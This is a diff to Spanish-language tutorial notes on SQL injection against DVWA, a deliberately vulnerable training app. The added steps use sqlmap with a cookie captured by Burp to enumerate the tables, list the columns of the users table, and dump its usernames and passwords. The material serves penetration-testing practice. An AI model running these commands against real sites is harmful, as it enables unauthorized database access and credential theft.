@@ -20,6 +20,14 @@ nueva ventana ---> 1 ---> submit
 --- Nos aparecerán las bases de datos asociadas (dvwa e information schema)
 --- A continuación enumeramos las tablas dentro de la base de datos dvwa mediante el siguiente comando:
 ---- sql map -u <"url_ventana_principal"> --cookie=<"cookie_encontrada_por_burp"> --data="id=1&Submit=Submit" -D dvwa --tables 
----- Nos aparecen las tablas asociadas: guestbook y users
+------  Nos aparecen las tablas asociadas: guestbook y users
+--- A continuación procedemos a mostrar las columnas dentro de la tabla usuarios mediante el siguiente comando:
+------ sql map -u <"url_ventana_principal"> --cookie=<"cookie_encontrada_por_burp"> --data="id=1&Submit=Submit" -D dvwa -T users 
+--columns 
+--- A continuación procedemos a mostrar la data de las columnas usuarios y contraseñas mediante el siguiente comando:
+------ sql map -u <"url_ventana_principal"> --cookie=<"cookie_encontrada_por_burp"> --data="id=1&Submit=Submit" -D dvwa -T users 
+-C user,password --dump
+------ Presionas y
+------ Enter
 
 
